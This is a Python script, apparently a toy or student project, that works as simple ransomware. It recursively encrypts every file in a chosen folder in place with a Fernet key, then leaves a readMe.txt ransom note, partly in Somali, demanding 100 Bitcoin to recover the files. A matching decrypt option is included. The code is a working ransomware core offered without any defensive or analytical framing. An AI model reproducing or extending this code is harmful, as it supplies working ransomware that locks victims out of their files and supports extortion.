import os
from cryptography.fernet import Fernet

# Generate a key and save it to a file
def generate_key():
    key = Fernet.generate_key()
    print(f"Generated key: {key}")
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Load the key from a file
def load_key():
    return open("key.key", "rb").read()

# Encrypt a single file
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        data = file.read()

    encrypted_data = fernet.encrypt(data)

    with open(file_path, "wb") as file:
        file.write(encrypted_data)

    print(f"Encrypted: {file_path}")

# Decrypt a single file
def decrypt_file(file_path, fernet):
    with open(file_path, "rb") as file:
        encrypted_data = file.read()

    decrypted_data = fernet.decrypt(encrypted_data)

    with open(file_path, "wb") as file:
        file.write(decrypted_data)

    print(f"Decrypted: {file_path}")

# Encrypt all files in a folder
def encrypt_folder(folder_path):
    key = load_key()
    fernet = Fernet(key)

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, fernet)

    # Create readMe.txt file
    readme_path = os.path.join(folder_path, "readMe.txt")
    with open(readme_path, "w", encoding="utf-8") as readme_file:
        readme_file.write("All files in this folder have been encrypted.\nWaarya hadaad rabto inaad files kaaga aad dib u hesho soo dir 100 BitCoin! 😂")

    print(f"Created readMe.txt in {folder_path}")

# Decrypt all files in a folder
def decrypt_folder(folder_path):
    key = load_key()
    fernet = Fernet(key)

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file == "readMe.txt":
                continue
            decrypt_file(file_path, fernet)

    # Delete the readMe.txt file
    readme_path = os.path.join(folder_path, "readMe.txt")
    if os.path.exists(readme_path):
        os.remove(readme_path)
        print(f"Deleted readMe.txt from {folder_path}")

def main():
    while True:
        print("\n=== file encryption by zuhayb and cabdinasir ===")
        print("1. Generate Key")
        print("2. Encrypt Folder")
        print("3. Decrypt Folder")
        print("4. Exit")

        try:
            choice = int(input("Choose an option (1-4): "))
        except ValueError:
            print("Invalid input. Please enter a number between 1 and 4.")
            continue

        if choice == 1:
            generate_key()
        elif choice == 2:
            folder_path = input("Enter the folder path to encrypt: ")
            if os.path.exists(folder_path):
                encrypt_folder(folder_path)
            else:
                print("Error: Folder path does not exist.")
        elif choice == 3:
            folder_path = input("Enter the folder path to decrypt: ")
            if os.path.exists(folder_path):
                decrypt_folder(folder_path)
            else:
                print("Error: Folder path does not exist.")
        elif choice == 4:
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()